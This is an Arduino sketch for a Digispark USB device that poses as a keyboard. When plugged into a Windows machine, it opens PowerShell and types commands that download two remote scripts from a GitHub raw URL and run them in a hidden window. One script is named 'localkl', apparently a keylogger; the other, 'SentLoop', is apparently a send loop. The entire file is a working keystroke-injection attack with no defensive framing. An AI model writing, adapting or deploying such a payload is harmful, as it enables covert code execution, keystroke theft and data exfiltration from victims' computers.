#include "DigiKeyboard.h"

void typeChar(uint8_t key, uint8_t mod = 0) {
  DigiKeyboard.sendKeyStroke(key, mod);
  DigiKeyboard.delay(100);
}

void setup() {
  DigiKeyboard.delay(2000); // Initial delay
}

void loop() {
  // Open Run (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Launch PowerShell
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  
  // Type the command using numeric keycodes:
  DigiKeyboard.print("Invoke-WebRequest -Uri ");
  
  // https://
  DigiKeyboard.print("https:");
  typeChar(56); // Forward slash (/)
  typeChar(56); // Second forward slash
  
  // raw.githubusercontent.com/...
  DigiKeyboard.print("raw.githubusercontent.com");
  typeChar(56); // /
  DigiKeyboard.print("brunosmassa");
  typeChar(56); // /
  DigiKeyboard.print("lab");
  typeChar(56); // /
  DigiKeyboard.print("refs");
  typeChar(56); // /
  DigiKeyboard.print("heads");
  typeChar(56); // /
  DigiKeyboard.print("main");
  typeChar(56); // /
  DigiKeyboard.print("localkl.txt");
  
  // -OutFile .\massa.ps1
  DigiKeyboard.print(" -OutFile ");
  typeChar(55); // Period (.)
  typeChar(49); // Backslash (\) - Keycode 49 for backslash
  DigiKeyboard.print("massa.ps1");
  
  // | powershell .\massa.ps1
  DigiKeyboard.print(" | powershell -windowstyle hidden ");
  typeChar(55); // Period (.)
  typeChar(49); // Backslash (\)
  DigiKeyboard.print("massa.ps1");
  
  // Execute
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  
  // Launch PowerShell
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);



  // Loop to DC
  DigiKeyboard.print("Invoke-WebRequest -Uri ");
  
  // https://
  DigiKeyboard.print("https:");
  typeChar(56); // Forward slash (/)
  typeChar(56); // Second forward slash
  
  // raw.githubusercontent.com/...
  DigiKeyboard.print("raw.githubusercontent.com");
  typeChar(56); // /
  DigiKeyboard.print("brunosmassa");
  typeChar(56); // /
  DigiKeyboard.print("lab");
  typeChar(56); // /
  DigiKeyboard.print("refs");
  typeChar(56); // /
  DigiKeyboard.print("heads");
  typeChar(56); // /
  DigiKeyboard.print("main");
  typeChar(56); // /
  DigiKeyboard.print("SentLoop");
  
  // -OutFile .\massa.ps1
  DigiKeyboard.print(" -OutFile ");
  typeChar(55); // Period (.)
  typeChar(49); // Backslash (\) - Keycode 49 for backslash
  DigiKeyboard.print("loop.ps1");
  
  // | powershell .\massa.ps1
  DigiKeyboard.print(" | powershell -windowstyle hidden ");
  typeChar(55); // Period (.)
  typeChar(49); // Backslash (\)
  DigiKeyboard.print("loop.ps1");
  
  // Execute
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  
  // Stop further execution
  for(;;) {}
}
